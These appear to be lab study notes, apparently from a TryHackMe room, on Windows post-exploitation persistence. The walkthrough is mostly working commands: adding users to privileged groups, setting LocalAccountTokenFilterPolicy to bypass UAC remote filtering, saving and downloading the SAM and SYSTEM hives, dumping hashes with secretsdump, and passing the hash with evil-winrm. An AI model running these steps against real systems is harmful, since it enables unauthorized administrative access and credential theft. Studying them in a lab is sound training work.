**We will assume that you have dumped the password hashes and successfully cracked the passwords for the unprivileged accounts in use.**

---
#### 1. Assign local users to Groups
**Direct way to make an unprivileged user gain administrative privileges is to make it part of the `Administrators group`**
```cmd
net localgroup administrators thmuser0 /add
```
- This will allow access to the server by using `RDP`, `WinRM`, or any other remote administration service.

If that looks suspicious, use the `Backup Operators` group. Users in this group won't have administrative privileges, but will be ***allowed to read/write any file or registry key on the system, ignoring any configured DACL***. This will allows us to copy the content of the `SAM` and `SYSTEM` registry hives.
```cmd
net localgroup "Backup Operators" thmuser1 /add
```
- It **cannot `RDP` or `WinRM`**, unless we add it to the `Remote Desktop Users (RDP)` or `Remote Management Users (WinRM)` groups.

---

2. **Since this is an unprivileged account, it can't RDP or WinRM back to the machine. So, add the user to these groups**
```cmd
# RDP
net localgroup "Remote Desktop Users" thmuser1 /add

# WinRM
net localgroup "Remote Management Users" thmuser1 /add
```

---
#### Evil-WinRM
1. **Attacker machine**
```bash
evil-winrm -i <TARGET-IP> -u <USERNAME> -p <PASSWORD>
```
- Even if you are connected from your ***attacker machine***, and even if you are on the ***Backup Operators or Administrators group***, you would ***not be able to access all files remotely because `UAC limits your privileges`***. This happens due to `LocalAccountTokenFilterPolicy`, which ***strips admin rights from local accounts during remote (WinRM) logins***. 
- Check the groups:
	```
	whoami /groups
	```
	- `Group used for deny only:` means the ***privileges are stripped*** away

2. **Regain `Administrator Privileges` from your user by disabling `LocalAccountTokenFilterPolicy`**
```cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

3. Re-establish the `WinRM` connection again and check that the `Backup Operators` group is enabled.

4. **Backup `SAM` and `SYSTEM` files**
```powershell
reg save hklm\system system.bak
reg save hklm\sam sam.bak

download system.bak
download sam.bak
```

5. **With those files, we can dump the password hashes for all users using `secretsdump.py`**
```python
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
```

#### Perform Pass-the-Hash
**Attacker machine**
```bash
evil-winrm -i <target-ip> -u <username> -H <NTLM-hash>
```

#### Example
**Dump the hash**
```bash
python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

**Perform pass-the-hash**
```bash
evil-winrm -i <target-ip> -u Administrator -H f3118544a831e728781d780cfdb9c1fa
```